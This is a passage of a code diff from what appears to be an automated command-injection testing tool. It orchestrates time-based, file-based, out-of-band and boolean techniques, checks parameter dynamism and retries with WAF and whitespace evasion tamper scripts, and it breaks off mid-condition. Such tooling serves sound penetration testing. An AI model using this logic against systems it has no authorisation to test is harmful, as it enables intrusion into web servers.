+  # Carrying the evaluation sink, this technique is skipped by whatever skips code injection - not
+  # by the flag that skips command injection, which the code injection heuristic sets on its way past.
+  skip_flag = "SKIP_CODE_INJECTIONS" if eval_sink else "SKIP_COMMAND_INJECTIONS"
+  run_technique(injection_type, technique, "TIME_BASED_STATE", skip_flag, "t", exploit, eval_sink=eval_sink)
+
+"""
+Check if it's exploitable via file-based command injection technique.
+"""
+def filebased_command_injection_technique(url, timesec, filename, http_request_method, url_time_response):
+  # The file proves execution either way - what the sink changes is only whether the command that
+  # fills it is reached through a shell or through the string the target evaluates.
+  eval_sink = bool(menu.options.eval_sink)
+  injection_type = settings.INJECTION_TYPE.BLIND_CE if eval_sink else settings.INJECTION_TYPE.BLIND
+  technique = settings.INJECTION_TECHNIQUE.FILE_BASED
+  # Prove the injection by a file the target writes and then serves back.
+  def exploit():
+    if settings.LOAD_SESSION and settings.INJECTION_TECHNIQUE.TEMP_FILE_BASED in settings.STORED_TECHNIQUES \
+       and settings.INJECTION_TECHNIQUE.FILE_BASED not in settings.STORED_TECHNIQUES:
+      # Skip the writable-directory prompt when resuming, but still need a real tmp_path.
+      result = tfb_handler.exploitation(url, timesec, filename, checks.default_tmp_path(), http_request_method, url_time_response)
+    else:
+      result = fb_handler.exploitation(url, timesec, filename, http_request_method, url_time_response, injection_type, technique)
+    if result is not False and not eval_sink:
+      settings.IDENTIFIED_COMMAND_INJECTION = True
+    return result
+  # Carrying the evaluation sink, this technique is skipped by whatever skips code injection - not
+  # by the flag that skips command injection, which the code injection heuristic sets on its way past.
+  skip_flag = "SKIP_CODE_INJECTIONS" if eval_sink else "SKIP_COMMAND_INJECTIONS"
+  run_technique(injection_type, technique, "FILE_BASED_STATE", skip_flag, "f", exploit, eval_sink=eval_sink)
+
+"""
+Check if it's exploitable via out-of-band technique.
+"""
+def oob_command_injection_technique(url, timesec, filename, http_request_method):
+  # The interaction proves execution either way - what the sink changes is only whether the command
+  # that reaches out is written in the shell's language or in the one the target evaluates.
+  eval_sink = bool(menu.options.eval_sink)
+  injection_type = settings.INJECTION_TYPE.BLIND_CE if eval_sink else settings.INJECTION_TYPE.BLIND
+  technique = settings.INJECTION_TECHNIQUE.OOB
+  # Prove the injection by the target reaching out to somewhere else.
+  def exploit():
+    result = oob_handler.exploitation(url, timesec, filename, http_request_method, injection_type, technique)
+    if result is not False and not eval_sink:
+      settings.IDENTIFIED_COMMAND_INJECTION = True
+    return result
+  # Carrying the evaluation sink, this technique is skipped by whatever skips code injection - not
+  # by the flag that skips command injection, which the code injection heuristic sets on its way past.
+  skip_flag = "SKIP_CODE_INJECTIONS" if eval_sink else "SKIP_COMMAND_INJECTIONS"
+  run_technique(injection_type, technique, "OOB_STATE", skip_flag,
+                settings.OOB_TECHNIQUE_LETTER, exploit, eval_sink=eval_sink)
+
+"""
+Check parameter in HTTP header.
+"""
+def check_parameter_in_http_header(check_parameter, place):
+  inject_http_headers = False
+  # Answered from the place the parameter was dispatched from, never from what it is called: a
+  # field named after a header is still a field, and a header is one wherever its value came from.
+  if place in settings.HTTP_HEADER_PLACES:
+    if settings.ACCEPT_VALUE not in settings.CUSTOM_HEADER_VALUE:
+      inject_http_headers = True
+  else:
+    init_http_header_injection_status()
+  return inject_http_headers
+
+"""
+Whether what a parameter does to the page is worth the request it takes to find out.
+
+Where the answer decides something, and where it explains something. '--skip-static' is the first:
+it acts on the answer by leaving the parameter alone. The boolean-based technique is the second,
+and was once left out of this on the grounds that no technique here reads a page by comparing it -
+which is the one thing that technique does, telling its true from its false by how far two pages
+differ. A parameter that changes no page at all has no such difference to give, so the whole
+boundary matrix is spent on it and what gets reported is a target that is not injectable, for a
+reason the run had already measured and said nothing about.
+"""
+def dynamism_worth_asking():
+  return bool(menu.options.skip_static or
+              checks.technique_selected("b", eval_sink=bool(menu.options.eval_sink)))
+
+"""
+Whether changing the parameter changes the response at all.
+
+The baseline both readings are taken against is the target's own and was taken when it was first
+reached, so this costs the one request that puts something else in the parameter's place. Only
+'--skip-static' skips on the answer; everything else is told and carries on.
+"""
+def check_parameter_dynamism(url, http_request_method, check_parameter):
+  if settings.LOAD_SESSION or not settings.TESTABLE_VALUE or not dynamism_worth_asking():
+    return
+
+  marker = settings.TESTABLE_VALUE + settings.INJECT_TAG
+
+  # Build the request, with the value carried wherever the parameter lives.
+  def build(header_name, option_value, value):
+    if settings.USER_DEFINED_POST_DATA:
+      data = settings.USER_DEFINED_POST_DATA.encode(settings.DEFAULT_CODEC)
+    else:
+      data = None
+    request = _urllib.request.Request(url, data, method=http_request_method)
+    headers.do_check(request)
+    request.add_header(header_name, option_value.replace(marker, value))
+    return request
+
+  if settings.COOKIE_INJECTION and menu.options.cookie and marker in menu.options.cookie:
+    param_label = "Cookie parameter '" + check_parameter + "'"
+    fetch = lambda v: build(settings.COOKIE, menu.options.cookie, v)
+  elif settings.USER_AGENT_INJECTION and menu.options.agent and marker in menu.options.agent:
+    param_label = "User-Agent HTTP header"
+    fetch = lambda v: build(settings.USER_AGENT, menu.options.agent, v)
+  elif settings.REFERER_INJECTION and menu.options.referer and marker in menu.options.referer:
+    param_label = "Referer HTTP header"
+    fetch = lambda v: build(settings.REFERER, menu.options.referer, v)
+  elif settings.HOST_INJECTION and menu.options.host and marker in menu.options.host:
+    param_label = "Host HTTP header"
+    fetch = lambda v: build(settings.HOST, menu.options.host, v)
+  else:
+    in_data = bool(menu.options.data) and marker in menu.options.data
+    if not in_data and marker not in url:
+      return
+    param_label = ("POST" if in_data else "GET") + " parameter '" + check_parameter + "'"
+    # Fetch the URL with one value in place of the parameter's own.
+    def fetch(v):
+      if in_data:
+        data = menu.options.data.replace(marker, v)
+        request = _urllib.request.Request(url, data.encode(settings.DEFAULT_CODEC), method=http_request_method)
+      else:
+        request = _urllib.request.Request(url.replace(marker, v), method=http_request_method)
+      headers.do_check(request)
+      return request
+
+  info_msg = "Testing if " + param_label + " is dynamic."
+  settings.print_data_to_stdout(settings.print_info_msg(info_msg))
+
+  placeholder = ''.join(random.choice(string.ascii_uppercase) for _ in range(3))
+
+  # Sent the way every other request is, so the pacing, retries and error handling that hold for
+  # the scan hold here too.
+  def _body(value):
+    response = requests.get_request_response(fetch(value))
+    if not response or isinstance(response, bool):
+      return None
+    try:
+      return checks.comparable_page(checks.process_page_content(response, action="decode"))
+    except Exception:
+      return None
+
+  """
+  The page as the target answers it with the value it was given, and how much it moves between two
+  such answers, are the target's own - not this parameter's. Both were taken once, when the target
+  was first reached, so what is left to ask here is what the page looks like with something else in
+  the parameter's place: one request, against a baseline every parameter shares.
+  """
+  real_body = settings.ORIGINAL_PAGE_COMPARABLE or None
+  noise = settings.PAGE_NOISE_RATIO
+  if real_body is None:
+    real_body = _body(settings.TESTABLE_VALUE)
+    # The same value asked for twice: whatever differs between these two is the page moving on its
+    # own, and a parameter is only dynamic where it changes the response by more than that.
+    repeat_body = _body(settings.TESTABLE_VALUE)
+    if real_body is None or repeat_body is None:
+      return
+    noise = difflib.SequenceMatcher(None, real_body, repeat_body).ratio()
+
+  placeholder_body = _body(placeholder)
+  if placeholder_body is None:
+    return
+
+  changed = difflib.SequenceMatcher(None, real_body, placeholder_body).ratio()
+  if changed >= max(noise, settings.STABILITY_SIMILARITY_THRESHOLD):
+    warn_msg = param_label + " does not appear to be dynamic."
+    settings.print_data_to_stdout(settings.print_warning_msg(warn_msg))
+    return False
+  # Said plainly, not held back for '-v': the run asked for this check, so its answer is news
+  # either way.
+  info_msg = param_label + " appears to be dynamic."
+  settings.print_data_to_stdout(settings.print_info_msg(info_msg))
+  return True
+
+"""
+Replace the parameter value with a placeholder an earlier run already confirmed the payload through.
+
+Not decided here on how the target answers the placeholder on its own. The value is what the command
+before the payload is given, so one the target was not answering on changes what that command does -
+a hostname that does not resolve where the real one did, failing where it used to succeed. A
+separator that chains on that command having succeeded then never fires, and one that chains on its
+having failed fires where the real value would never have let it, so the finding is either missed
+outright or is one that does not reproduce. Nothing available before the payload has an oracle tells
+those apart: a value worth skipping at all is one the target spends time on, and that time is the
+command's own. So the exchange is made after detection instead, where the boundary it was found on
+can re-ask the question and the answer says whether the placeholder still carries it.
+"""
+def attempt_skip_testable_value(url, http_request_method, check_parameter):
+  if not settings.TESTABLE_VALUE or not settings.LOAD_SESSION:
+    return url
+  if any((settings.COOKIE_INJECTION, settings.USER_AGENT_INJECTION, settings.REFERER_INJECTION,
+          settings.HOST_INJECTION, settings.CUSTOM_HEADER_INJECTION)):
+    return url
+
+  marker = settings.TESTABLE_VALUE + settings.INJECT_TAG
+  in_data = bool(menu.options.data) and marker in menu.options.data
+  in_url = marker in url
+  if not in_data and not in_url:
+    return url
+
+  # Confirmed on the run that stored it, through the boundary it was found on, so it is taken as it
+  # stands rather than asked about again.
+  stored_placeholder = session_handler.check_stored_testable_value(url, check_parameter, http_request_method)
+  if not stored_placeholder:
+    return url
+  if in_data:
+    menu.options.data = menu.options.data.replace(marker, stored_placeholder + settings.INJECT_TAG)
+  else:
+    url = url.replace(marker, stored_placeholder + settings.INJECT_TAG)
+  settings.TESTABLE_VALUE_STOOD_IN_FOR = settings.TESTABLE_VALUE
+  settings.TESTABLE_VALUE = stored_placeholder
+  settings.TESTABLE_VALUE_OPTIMIZED = True
+  return url
+
+"""
+Proceed to the injection process for the appropriate parameter.
+"""
+def injection_process(url, check_parameter, http_request_method, filename, timesec, place):
+  # Every parameter starts with its value kept, whatever the one before it needed: the pass that
+  # replaces it is reached per parameter, and exploitation follows within this same call, so leaving
+  # the mode set would only decide how the parameters after this one are tested.
+  settings.REPLACE_VALUE = False
+  # Every parameter is asked the value question for itself: one that needed its value says nothing
+  # about the next, and a refusal carried over would have the next parameter pay the slow price too.
+  settings.VALUE_SKIPPED_EARLY = None
+  settings.VALUE_SKIP_REFUSED = False
+  # Named with '--param-filter': a parameter is tested only where it travels in one of the places
+  # asked for, and nothing is said about the rest - naming them is saying which ones matter.
+  if settings.PARAM_FILTER_PLACES and str(place).upper() not in settings.PARAM_FILTER_PLACES:
+    if settings.VERBOSITY_LEVEL != 0:
+      debug_msg = "Skipping the '" + str(place) + "' parameter '" + str(check_parameter) + "', which '--param-filter' does not name."
+      settings.print_data_to_stdout(settings.print_debug_msg(debug_msg))
+    return
+  # Matched with '--param-exclude', against the parameter's own name and against the place it
+  # travels in, either of which is enough to leave it alone.
+  if menu.options.param_exclude and (re.search(menu.options.param_exclude, str(check_parameter), re.I) or \
+     re.search(menu.options.param_exclude, str(place), re.I)):
+    info_msg = "Skipping the parameter '" + str(check_parameter) + "', excluded with '--param-exclude'."
+    settings.print_data_to_stdout(settings.print_info_msg(info_msg))
+    return
+
+  settings.NOT_TESTABLE_PARAMETERS = False
+  reset_parameter_state()
+  # Bound here rather than where the techniques run: the parameter may be skipped before reaching
+  # them, and the loop over operating systems below reads this either way.
+  end_detection = False
+
+  # False only where the check ran and the response never moved with the parameter - where it did
+  # not run, nothing was learned and the parameter is tested as it would have been.
+  """
+  Recognised before the value can be swapped for a placeholder below: a value that has been thrown
+  away is one nothing can notice the encoding of.
+
+  Where it is written in something, the request is rewritten to carry what it stands for, and the
+  writing back is done on the way out - so everything in between is testing the value the target
+  itself will read, rather than the envelope it arrived in.
+  """
+  # What the value stands for, once whatever it is written in has been taken off it.
+  def read_value_as(description):
+    nonlocal url
+    """
+    Read off the value the target reads, not the spelling the URL carries it in.
+
+    A query string writes a base64 value's own padding as '%3D', so taken as it arrived the value
+    is not base64 at all and a parameter that carries one perfectly well is refused for not
+    carrying one. Writing it back out is already done on the unquoted value, so reading it in is
+    done the same way here.
+    """
+    carried = _urllib.parse.unquote(settings.TESTABLE_VALUE)
+    decoded = checks.strip_encoding(carried, description)
+    # Written out again it has to give back what arrived, or what was read was not the value.
+    if checks.apply_encoding(decoded, description) != carried:
+      raise ValueError("the value is not written in that encoding")
+    settings.VALUE_ENCODING = description
+    if decoded != settings.TESTABLE_VALUE:
+      if menu.options.data:
+        menu.options.data = menu.options.data.replace(settings.TESTABLE_VALUE, decoded)
+      # The envelope is taken off wherever the value rides, not just in the body and the URL - a
+      # carrier left holding the written-out value appends the payload to that instead, and what
+      # goes out is the whole envelope with the payload after it rather than the value replaced.
+      for option in ("cookie", "header", "headers", "host", "referer", "agent", "auth_cred"):
+        carried = getattr(menu.options, option, None)
+        if carried and settings.TESTABLE_VALUE in str(carried):
+          setattr(menu.options, option, str(carried).replace(settings.TESTABLE_VALUE, decoded))
+      url = url.replace(settings.TESTABLE_VALUE, decoded)
+      settings.TESTABLE_VALUE = decoded
+
+  # Read off the value itself, not the spelling the URL carries it in: a base64 value's own padding
+  # rides as '%3D', and a descriptor worked out from that reads the value as carrying none - so
+  # writing it back out drops the padding and the value no longer matches what arrived.
+  named = checks.named_encoding(check_parameter, _urllib.parse.unquote(settings.TESTABLE_VALUE))
+  if settings.LOAD_SESSION:
+    """
+    A finding read back from a session carries the encoding it was made with, so there is nothing
+    to work out here. A name is only a fallback for a row stored before that was kept - and there,
+    a value that will not decode is one that was stored already decoded.
+    """
+    if named and not settings.VALUE_ENCODING:
+      try:
+        read_value_as(named)
+      except Exception:
+        pass
+  elif named:
+    # Named for this parameter, which settles it without asking.
+    try:
+      read_value_as(named)
+    except Exception:
+      err_msg = "The " + str(check_parameter) + " parameter does not carry a valid "
+      err_msg += str(settings.PARAMETER_ENCODINGS.get(check_parameter, settings.PARAMETER_ENCODING_DEFAULT))
+      err_msg += "-encoded value ('" + str(settings.TESTABLE_VALUE) + "')."
+      settings.print_data_to_stdout(settings.print_critical_msg(err_msg))
+      raise SystemExit(settings.EXIT_FAILURE)
+  elif not menu.options.skip_heuristics:
+    # Otherwise it is recognised, and what it stands for is what the rest of the run tests.
+    decoded, _encoding = checks.recognise_payload(payload=settings.TESTABLE_VALUE)
+    if settings.VALUE_ENCODING and decoded != settings.TESTABLE_VALUE:
+      if menu.options.data:
+        menu.options.data = menu.options.data.replace(settings.TESTABLE_VALUE, decoded)
+      url = url.replace(settings.TESTABLE_VALUE, decoded)
+      settings.TESTABLE_VALUE = decoded
+
+  is_dynamic = check_parameter_dynamism(url, http_request_method, check_parameter)
+  if is_dynamic is False and menu.options.skip_static and not checks.explicitly_testable(check_parameter):
+    info_msg = "Skipping static parameter '" + check_parameter + "'."
+    settings.print_data_to_stdout(settings.print_info_msg(info_msg))
+    return
+
+  url = attempt_skip_testable_value(url, http_request_method, check_parameter)
+
+  # Both, where the target's own answer did not identify one - that being what the question asked.
+  # Taken by name: the class carries more attributes than the two, so slicing them handed back a
+  # module path as an operating system.
+  if settings.CHECK_BOTH_OS:
+    os_targets = [settings.OS.UNIX, settings.OS.WINDOWS][:settings.OS_CHECKS_NUM]
+  else:
+    os_targets = [settings.TARGET_OS or settings.OS.UNIX]
+
+  # Loop over the selected OS targets
+  for os_target in os_targets:
+    # A heuristic on an earlier pass may have settled which shell answers. Sweeping the other one
+    # then costs a second full pass and, worse, writes over what was identified.
+    if settings.IDENTIFIED_TARGET_OS and settings.TARGET_OS != os_target:
+      continue
+    settings.TARGET_OS = os_target
+
+    if settings.PERFORM_BASIC_SCANS:
+      if not settings.LOAD_SESSION:
+        settings.LOAD_SESSION = None
+      basic_level_checks()
+
+    inject_http_headers = check_parameter_in_http_header(check_parameter, place)
+
+    if inject_http_headers:
+      checks.define_vulnerable_http_header(check_parameter)
+
+    # User-Agent/Referer/Host/Custom HTTP header Injection(s)
+    if any((settings.USER_AGENT_INJECTION, settings.REFERER_INJECTION, settings.HOST_INJECTION, settings.CUSTOM_HEADER_INJECTION)):
+      header_name = ""
+      the_type = "HTTP Header"
+      inject_parameter = " parameter '" + check_parameter + "'"
+    else:
+      if settings.COOKIE_INJECTION:
+        header_name = settings.COOKIE
+      else:
+        header_name = ""
+      the_type = " parameter"
+      inject_parameter = " '" + check_parameter + "'"
+
+    # Nothing left to probe when all required time-related techniques were resumed.
+    time_techniques_resumed = False
+    if checks.technique_selected("t") or checks.technique_selected("f"):
+      needed_time_techniques = set()
+      if checks.technique_selected("t"):
+        needed_time_techniques.add(settings.INJECTION_TECHNIQUE.TIME_BASED)
+      if checks.technique_selected("f"):
+        needed_time_techniques.add(settings.INJECTION_TECHNIQUE.TEMP_FILE_BASED)
+      time_techniques_resumed = settings.LOAD_SESSION and needed_time_techniques.issubset(settings.STORED_TECHNIQUES.keys())
+
+    # Defer response-time estimation until a time-related technique is about to run.
+    url_time_response = 0
+    _time_warmup_done = False
+    # Take the timing model once, before the first technique that needs one.
+    def _ensure_time_warmup():
+      nonlocal timesec, url_time_response, _time_warmup_done
+      if _time_warmup_done or settings.SKIP_COMMAND_INJECTIONS:
+        return
+      _time_warmup_done = True
+      if time_techniques_resumed:
+        url_time_response = 0
+      elif settings.ESTIMATED_TIMESEC is not None:
+        # How long the target takes to answer is the target's own, not this parameter's: measured
+        # once, and read by every parameter after it.
+        timesec, url_time_response = settings.ESTIMATED_TIMESEC, settings.URL_TIME_RESPONSE
+      else:
+        timesec, url_time_response = requests.estimate_response_time(url, timesec, http_request_method)
+        settings.ESTIMATED_TIMESEC = timesec
+
+    # Load modules
+    modules_handler.load_modules(url, http_request_method, filename)
+
+    settings.CHECKING_PARAMETER = ""
+    if not header_name == settings.COOKIE and not the_type == "HTTP Header":
+      settings.CHECKING_PARAMETER = checks.check_http_method(url)
+      settings.CHECKING_PARAMETER += ('', ' JSON')[settings.IS_JSON] + ('', ' SOAP/XML')[settings.IS_XML]
+    if header_name == settings.COOKIE :
+       settings.CHECKING_PARAMETER += str(header_name) + str(the_type) + str(inject_parameter)
+    elif the_type == "HTTP Header":
+       settings.CHECKING_PARAMETER += check_parameter.title() + " HTTP Header"
+    else:
+       settings.CHECKING_PARAMETER += str(the_type) + str(header_name) + str(inject_parameter)
+
+    if check_parameter in settings.CUSTOM_INJECTION_MARKER_PARAMETERS_LIST and not checks.already_tested(place, check_parameter):
+      settings.CHECKING_PARAMETER = "(custom) " + settings.CHECKING_PARAMETER
+
+    """
+    A rewrite adopted for the parameter before this one is dropped here.
+
+    What got past that parameter's filter says nothing about this one, and the scripts are not free
+    to carry: '${IFS}' in place of every space is itself filtered on some targets, so a parameter
+    that would have answered a plain payload is reported as not injectable instead - found only by
+    testing it on its own. Whatever this parameter needs, it adopts again for itself.
+    """
+    checks.drop_auto_tampers()
+
+    if not settings.LOAD_SESSION:
+      info_msg = "Setting " + settings.CHECKING_PARAMETER  + " for tests."
+      settings.print_data_to_stdout(settings.print_info_msg(info_msg))
+
+    if menu.options.skip_heuristics:
+      if settings.VERBOSITY_LEVEL != 0:
+        debug_msg = "Skipping heuristic (basic) test on the " + settings.CHECKING_PARAMETER + "."
+        settings.print_data_to_stdout(settings.print_debug_msg(debug_msg))
+    else:
+      if not settings.LOAD_SESSION:
+        checks.recognise_payload(payload=settings.TESTABLE_VALUE)
+        info_msg = "Performing heuristic (basic) test on the " + settings.CHECKING_PARAMETER + "."
+        settings.print_data_to_stdout(settings.print_info_msg(info_msg))
+
+        try:
+          url = command_injection_heuristic_basic(url, http_request_method, check_parameter, place)
+
+          # Asked for out-of-band, so probe the channel either way: whether the target can reach it
+          # at all, and over which client, is a separate question from whether it is injectable.
+          if menu.options.oob:
+            url = oob_heuristic_basic(url, http_request_method, check_parameter, place)
+
+          # What this looks for is the sink, not a technique, so which technique will carry it has no
+          # bearing on whether it is worth looking - and where the switch was not given at all, this
+          # is what offers it.
+          if not settings.IDENTIFIED_COMMAND_INJECTION:
+            # Check for identified warnings
+            url = code_injections_heuristic_basic(url, http_request_method, check_parameter, place)
+        except KeyboardInterrupt:
+          try:
+            checks.handle_detection_interrupt(filename, url)
+          except (settings.SkipTechniqueException, settings.RetryTechniqueException):
+            # No technique is running yet at this stage - just skip past heuristics.
+            pass
+          except settings.EndDetectionPhaseException:
+            break
+
+        # Asked last and only where nothing else could answer, "no" still being a fair answer.
+        if settings.OS_IDENTIFICATION_PENDING:
+          settings.OS_IDENTIFICATION_PENDING = False
+          warn_msg = "Unable to fingerprint the target operating system."
+          settings.print_data_to_stdout(settings.print_warning_msg(warn_msg))
+          checks.define_target_os()
+
+        # The probe above is written with the same '$(...)' every payload after it is, so a filter
+        # on that one character refuses it before the sink is reached - and the parameter is put
+        # down as not injectable rather than as asked the wrong way. One more ask, with the
+        # substitution written as backticks, settles which of the two it was. Paid for only where
+        # the probe already found nothing, and only once the user has said it is worth paying.
+        if not settings.IDENTIFIED_COMMAND_INJECTION and not settings.IDENTIFIED_WARNINGS and not settings.IDENTIFIED_EVAL_PROBE and \
+           checks.may_retry_through_backticks() and checks.backtick_retry_consent():
+          settings.AUTO_TAMPER.append("backticks")
+          checks.tamper_scripts(stored_tamper_scripts=False)
+          url = command_injection_heuristic_basic(url, http_request_method, check_parameter, place)
+          if not settings.IDENTIFIED_COMMAND_INJECTION and not settings.IDENTIFIED_WARNINGS and not settings.IDENTIFIED_EVAL_PROBE:
+            # It answered nothing either, so the rest of this parameter is not carried through a
+            # script that turned out to be about something else.
+            checks.drop_auto_tampers()
+
+        if not settings.IDENTIFIED_COMMAND_INJECTION and not settings.IDENTIFIED_WARNINGS and not settings.IDENTIFIED_EVAL_PROBE:
+          settings.HEURISTIC_TEST.POSITIVE = False
+          warn_msg = "Heuristic (basic) test shows that "
+          warn_msg += settings.CHECKING_PARAMETER + " might not be injectable."
+          settings.print_data_to_stdout(settings.print_bold_warning_msg(warn_msg))
+
+    if (menu.options.smart and not settings.HEURISTIC_TEST.POSITIVE) or (menu.options.smart and menu.options.skip_heuristics):
+      info_msg = "Skipping "
+      info_msg += settings.CHECKING_PARAMETER + "."
+      settings.print_data_to_stdout(settings.print_info_msg(info_msg))
+      settings.HEURISTIC_TEST.POSITIVE = True
+    else:
+      if menu.options.failed_tries and \
+         menu.options.tech and not "f" in menu.options.tech:
+        warn_msg = "Due to the provided (unsuitable) injection technique"
+        warn_msg += "s"[len(menu.options.tech) == 1:][::-1] + ", "
+        warn_msg += "ignoring the option '--failed-tries'."
+        settings.print_data_to_stdout(settings.print_warning_msg(warn_msg))
+
+      # Procced with file-based blind command injection technique,
+      # once the user provides the path of web server's root directory.
+      if menu.options.web_root and settings.USER_APPLIED_TECHNIQUE and not "f" in menu.options.tech:
+        menu.options.web_root = checks.normalize_target_dir(menu.options.web_root)
+        # Asked once and held for the run, since the technique list it narrows is put back for
+        # every parameter - the question is about the document root, which does not change.
+        if settings.FILE_BASED_NARROWING_CHOICE is None:
+          settings.FILE_BASED_NARROWING_CHOICE = checks.procced_with_file_based_technique()
+        if settings.FILE_BASED_NARROWING_CHOICE:
+          menu.options.tech = "f"
+
+      # Whether a stored finding already answers what this technique would ask.
+      def _time_related_resume_redundant():
+        # A resumed finding is already confirmed, so re-verifying the slow ones adds nothing
+        # when a results-based technique is stored too.
+        return settings.LOAD_SESSION and not settings.USER_APPLIED_TECHNIQUE and any(
+          _ in settings.STORED_TECHNIQUES for _ in (settings.INJECTION_TECHNIQUE.RESULTS_BASED, settings.INJECTION_TECHNIQUE.DYNAMIC_CODE))
+
+      # Test the parameter by how long the target takes to answer.
+      def _run_time_based():
+        if _time_related_resume_redundant():
+          return
+        if checks.technique_selected("t", eval_sink=bool(menu.options.eval_sink)):
+          _ensure_time_warmup()
+          # A resumed finding is re-verified against its own full delay, so the model can wait
+          # until the first command actually needs it.
+          if not (settings.LOAD_SESSION and settings.INJECTION_TECHNIQUE.TIME_BASED in settings.STORED_TECHNIQUES):
+            checks.warm_up_response_baseline(url, http_request_method)
+        return timebased_technique(url, timesec, filename, http_request_method, url_time_response)
+
+      # Test the parameter by a file the target writes and then serves back.
+      def _run_file_based():
+        if _time_related_resume_redundant():
+          return
+        if len(menu.options.tech) == 0 or "f" in menu.options.tech:
+          _ensure_time_warmup()
+        return filebased_command_injection_technique(url, timesec, filename, http_request_method, url_time_response)
+
+      end_detection = False
+      techniques = [
+        lambda: results_based_command_injection_technique(url, timesec, filename, http_request_method),
+        lambda: dynamic_code_evaluation_technique(url, timesec, filename, http_request_method),
+        _run_time_based,
+        _run_file_based,
+        lambda: oob_command_injection_technique(url, timesec, filename, http_request_method),
+      ]
+      # Ahead of the delay-based one, being the cheaper way to ask the same question - and tried like
+      # any other technique, since the page it reads its answer off is there whether or not the run
+      # named what a true answer looks like.
+      techniques.insert(2, lambda: boolean_based_technique(url, timesec, filename, http_request_method))
+      # Work through the techniques in turn, carrying on past the ones that find nothing.
+      def _run_techniques():
+        technique_idx = 0
+        while technique_idx < len(techniques):
+          try:
+            techniques[technique_idx]()
+            # The evasion was stepped up while this ran, so the technique never got a fair try.
+            if settings.WAF_EVASION_ESCALATED:
+              settings.WAF_EVASION_ESCALATED = False
+              continue
+            technique_idx += 1
+          except settings.SkipTechniqueException:
+            technique_idx += 1
+          except settings.RetryTechniqueException:
+            pass
+          except settings.EndDetectionPhaseException:
+            return True
+        return False
+
+      def _reset_web_root_detection():
+        # A retry below is the one case where the web root genuinely needs working out again:
+        # the candidate list a filtered-out pass already walked through and gave up on says
+        # nothing about whether the tamper this retry is about to apply would have fared any
+        # better on any one of those same candidates - left alone, 'custom_web_root()' sees
+        # candidates already exhausted and reaches straight past all of them for '/tmp/'. And
+        # 'menu.options.web_root' is what the first pass's own result gets cached into once it
+        # settles on one - left set, 'check_tmp_path()' reuses that cached answer directly and
+        # never calls back into 'custom_web_root()' at all, retry or not.
+        settings.CUSTOM_WEB_ROOT = False
+        settings.WEB_ROOT_CANDIDATES = []
+        settings.WEB_ROOT_SETTLED_ONCE = False
+        settings.WEB_ROOT = settings.DEFAULT_WEB_ROOT
+        menu.options.web_root = False
+
+      """
+      One pass of the techniques, and the verification of whatever it confirmed.
+
+      Verified here rather than once at the end, because everything below reads "has anything been
+      confirmed yet" to decide whether to reach further. A finding that the re-ask takes back is not
+      a confirmation, and counted as one it closes every escalation behind it: the run reports "not
+      injectable" having skipped the passes that would have looked. Costs nothing on a pass that
+      confirmed nothing, which is the pass this is standing in front of.
+      """
+      def _run_and_verify():
+        mark = len(settings.CONFIRMED_INJECTION_POINTS)
+        ended = _run_techniques()
+        checks.final_false_positive_check(url, http_request_method, check_parameter, timesec, mark)
+        return ended
+
+      # An escalation already handled during the heuristic test, ahead of this first pass, would
+      # otherwise read here as "stepped up while the technique about to run was mid-flight" - and
+      # send the very first technique around a second, needless time before it is even one request in.
+      settings.WAF_EVASION_ESCALATED = False
+      end_detection = _run_and_verify()
+      # Nothing got through while a protection is in the way, so reach for a heavier evasion and
+      # give the techniques another go - being blocked throughout is the answer this waits for.
+      while not end_detection and checks.injection_techniques_status() is False and \
+            settings.WAF_ENABLED and checks.escalate_waf_evasion(on_block=False):
+        settings.WAF_EVASION_ESCALATED = False
+        _reset_web_root_detection()
+        end_detection = _run_and_verify()
+
+      """
+      Whether this run gets to reach for a rewrite of its own.
+
+      '--tamper' is the user's own answer to the question these passes exist to ask, so where it was
+      given, it is the only answer applied - a script added behind it is one they did not ask for,
+      and stacking ours on top is what earns the "too many tamper scripts" warning against a run
+      that named exactly one.
+      """
+      def _may_adopt_tamper():
+        return not (settings.USER_APPLIED_TAMPER or menu.options.tamper)
+
+      """
+      Whether to go around a filtered whitespace at all.
+
+      Sending every technique around again costs about what the pass before it did, so it is offered
+      rather than spent unannounced. Asked once and held for the run: the answer is about the
+      target's own filter, not about whichever technique happened to come back empty first.
+      """
+      def _accepts_whitespace_retry():
+        if settings.WHITESPACE_RETRY_CHOICE is None:
+          # Only what was actually established is stated here. That nothing was confirmed with a
+          # plain whitespace is a fact about this run; that the target is filtering one is a guess,
+          # and far more often than not the parameter simply never reached a shell - a mistyped
+          # name answers exactly like a filtered space does. The guess belongs in the question,
+          # where it reads as the reason to try rather than as something already found.
+          # Worded as the WAF/IPS consent next to it is, since it is the same question asked about a
+          # different obstacle. No script named: one is turned on here and another behind it where
+          # that one is filtered too, so naming the first reads as a promise that it is the only
+          # one - each says which it loaded as it loads it, which is where that belongs.
+          message = "Do you want " + settings.APPLICATION + " to try again in case plain whitespace is being filtered "
+          message += "(e.g. by using whitespace tamper scripts)? [Y/n] "
+          settings.WHITESPACE_RETRY_CHOICE = common.read_input(message, default="Y", check_batch=True) not in settings.CHOICE_NO
+        return settings.WHITESPACE_RETRY_CHOICE
+
+      def _accepts_replaced_value_retry():
+        if settings.REPLACE_VALUE_RETRY_CHOICE is None:
+          # Asked for the same reason the two above are: nothing was confirmed, and that the sink
+          # reads the value's own first byte is the guess that makes another pass worth paying for.
+          message = "Do you want " + settings.APPLICATION + " to try again with the payload in place of "
+          message += "the parameter's value rather than behind it? [Y/n] "
+          settings.REPLACE_VALUE_RETRY_CHOICE = common.read_input(message, default="Y", check_batch=True) not in settings.CHOICE_NO
+        return settings.REPLACE_VALUE_RETRY_CHOICE
+
+      def _accepts_dashless_retry():
+        if settings.DASHLESS_RETRY_CHOICE is None:
+          # Asked for the same reason the whitespace one above is: what was established is that
+          # nothing was confirmed, and that the target filters a dash is the guess that makes
+          # another pass worth paying for - so it belongs in the question rather than stated as
+          # something already found.
+          message = "Do you want " + settings.APPLICATION + " to try again in case a dash ('-') is being filtered "
+          message += "(e.g. by using a tamper script that writes its tests without one)? [Y/n] "
+          settings.DASHLESS_RETRY_CHOICE = common.read_input(message, default="Y", check_batch=True) not in settings.CHOICE_NO
+        return settings.DASHLESS_RETRY_CHOICE
+
+
+      # A filter that rejects any literal whitespace blocks the heuristic test the same as every
+      # technique, so gating this on a positive heuristic would never fire for the one case it
+      # exists for. 'MULTI_ENCODED_PAYLOAD' already carrying the script is what keeps it from
+      # firing twice, or where it was asked for by name.
+      if not end_detection and checks.injection_techniques_status() is False and \
+            _may_adopt_tamper() and "space2ifs" not in settings.MULTI_ENCODED_PAYLOAD and \
+            _accepts_whitespace_retry():
